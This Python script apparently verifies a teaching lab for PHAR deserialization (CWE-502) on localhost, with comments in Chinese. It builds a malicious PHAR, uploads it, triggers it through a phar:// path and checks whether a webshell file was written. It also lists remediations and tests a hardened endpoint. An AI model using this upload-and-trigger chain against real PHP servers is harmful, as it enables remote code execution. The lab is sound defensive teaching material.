#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
=============================================================================
 verify_pharlab.py — PHAR 反序列化驗證
=============================================================================
 驗證三項：
   P1  PHAR metadata 反序列化（CWE-502）
   P2  md5_file() 觸發 phar://（CWE-502）
   P3  __destruct() 任意寫檔（CWE-502）

 用法：
   python verify_pharlab.py 8991
=============================================================================
"""

import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 8991
BASE = "http://127.0.0.1:%d" % PORT
LAB = os.path.dirname(os.path.abspath(__file__))
PHP = os.path.join(os.environ.get("TEMP", ""), "php83", "php.exe")
results = []


def get(path):
    try:
        with urllib.request.urlopen(BASE + path, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def upload(filepath, name):
    with open(filepath, "rb") as f:
        content = f.read()
    boundary = "----B" + uuid.uuid4().hex[:16]
    parts = [
        ("--" + boundary).encode(),
        ('Content-Disposition: form-data; name="file"; filename="%s"' % name).encode(),
        b"Content-Type: application/octet-stream",
        b"",
        content,
        ("--" + boundary + "--").encode(),
        b"",
    ]
    body = b"\r\n".join(parts)
    req = urllib.request.Request(
        BASE + "/upload", data=body,
        headers={"User-Agent": "phar-edu/1.0",
                 "Content-Type": "multipart/form-data; boundary=" + boundary})
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:                                   # noqa: BLE001
        return -1, str(e)


def txt(b):
    return re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", b)).strip()


def check(name, cwe, passed, evidence):
    results.append((name, cwe, passed, evidence))
    mark = "PASS（漏洞存在）" if passed else "FAIL（未觸發）"
    print("\n" + "-" * 76)
    print("[%s] %s  —  %s" % (mark, name, cwe))
    print("-" * 76)
    for line in evidence.splitlines():
        print("   " + line)


def main():
    print("=" * 76)
    print(" PHARLab 驗證 — PHAR 反序列化")
    print(" 目標：%s" % BASE)
    print("=" * 76)

    st, _ = get("/")
    if st != 200:
        print("\n[錯誤] 無法連線（HTTP %s）" % st)
        sys.exit(1)

    shell = os.path.join(LAB, "upload", "shell.php")
    flag_file = os.path.join(LAB, "secrets", "flag.txt")
    phar_file = os.path.join(LAB, "payload.phar")

    # 清理舊檔案
    for f in (shell, phar_file, os.path.join(LAB, "destruct.log")):
        if os.path.exists(f):
            os.remove(f)

    # ============ 步驟 0：生成 PHAR ============
    print("\n[0] 生成 PHAR（metadata = Logger 物件）")
    r = subprocess.run([PHP, "-d", "phar.readonly=0",
                        os.path.join(LAB, "gen_phar_lab.php")],
                       capture_output=True, text=True, encoding="utf-8", errors="replace", cwd=LAB)
    out = (r.stdout or "")
    print("  " + out.strip().replace("\n", "\n  "))
    phar_ok = os.path.exists(phar_file)
    print("  PHAR 存在:", phar_ok)

    # ============ 步驟 1：上傳 ============
    print("\n[1] 上傳 payload.phar")
    st1, b1 = upload(phar_file, "payload.phar")
    print("  HTTP %s → %s" % (st1, txt(b1)[:200]))
    upload_ok = "Uploaded to" in b1

    # ============ 步驟 2：觸發 phar:// ============
    print("\n[2] 觸發：/check?f=phar://.../payload.phar/test.txt")
    phar_path = "phar://" + phar_file.replace("\\", "/") + "/test.txt"
    st2, b2 = get("/check?f=" + urllib.parse.quote(phar_path, safe=""))
    print("  HTTP %s" % st2)
    print("  " + txt(b2)[:300])
    triggered = "metadata type: Logger" in b2

    # ============ 步驟 3：檢查 shell 是否被寫入 ============
    # 注意：__destruct 在請求結束後執行，所以要在請求之後檢查檔案系統
    shell_written = os.path.exists(shell)
    shell_content = ""
    if shell_written:
        with open(shell, "r", encoding="utf-8", errors="replace") as f:
            shell_content = f.read()

    ev = [
        "PHAR 生成  : %s（%d bytes）" % (phar_ok, os.path.getsize(phar_file) if phar_ok else 0),
        "上傳        : %s" % ("成功" if upload_ok else "失敗"),
        "觸發        : getMetadata(phar://...) → %s" % ("成功（metadata type: Logger）" if triggered else "失敗"),
        "★ shell 寫入: %s" % ("是（%d bytes）" % len(shell_content) if shell_written else "否"),
        "shell 內容  : %s" % shell_content[:150],
        "預期漏洞    : PHAR metadata 被反序列化 → __destruct() 執行 → 任意寫檔",
        "★ 版本註記  : PHP 8.3 已不對檔案操作自動反序列化 metadata",
        "              （本靶場用明確 getMetadata() 模擬舊版行為）",
        "根因        : (a) phar:// 包裝器可觸發 metadata 反序列化",
        "              (b) PHAR metadata 自動反序列化",
        "              (c) Logger::__destruct() 可任意寫檔",
        "危害        : 寫入 webshell → RCE",
        "驗證方式    : **上傳 PHAR → 用 phar:// 觸發 → 檢查 shell 是否被寫入**",
        "修補方向    : ① 不信任上傳檔案的包裝器（白名單 phar:// 之外）",
        "              ② 用 allowed_classes 限制反序列化",
        "              ③ 用 JSON 取代序列化",
        "              ④ 避免在 __destruct 中做危險操作",
        "OWASP 對照: CWE-502（不可信資料反序列化）",
    ]
    check("P1/P2/P3 PHAR 反序列化 → 任意寫檔", "CWE-502",
          phar_ok and upload_ok and triggered and shell_written, "\n".join(ev))

    # ============ 安全對照：/safe/check ============
    st_s, b_s = get("/safe/check?f=" + urllib.parse.quote(phar_path, safe=""))
    safe_blocked = (st_s == 400) and ("REJECTED" in b_s)
    ev = [
        "請求      : /safe/check?f=phar://...",
        "回應      : HTTP %s → %s" % (st_s, txt(b_s)[:150]),
        "預期結果  : 被拒絕（不允許包裝器）",
        "安全實作  : ① 拒絕含 '://' 或 'phar' 的路徑",
        "            ② realpath 檢查必須在 upload 目錄內",
        "教學意義  : **同一個 md5_file()，加上包裝器檢查就安全**",
    ]
    check("安全對照：/safe/check 拒絕 phar://", "防護驗證",
          safe_blocked, "\n".join(ev))

    # ================= 總結 =================
    print("\n" + "=" * 76)
    print(" 總結")
    print("=" * 76)
    found = sum(1 for _, _, p, _ in results if p)
    for name, cwe, passed, _ in results:
        print("  %-38s %-14s %s" % (name, cwe, "成立" if passed else "未觸發"))
    print("-" * 76)
    print("  通過 %d/%d" % (found, len(results)))
    print()
    print("  PHAR 反序列化的核心：")
    print("    phar:// 包裝器讓『讀取檔案』變成『執行反序列化』")
    print("    —— 即使程式碼中沒有 unserialize()")
    print("=" * 76)

    with open("pharlab_result.json", "w", encoding="utf-8") as f:
        json.dump([{"name": n, "cwe": c, "present": p} for n, c, p, _ in results],
                  f, ensure_ascii=False, indent=2)
    print("\n（JSON 摘要已寫入 pharlab_result.json）")


if __name__ == "__main__":
    main()
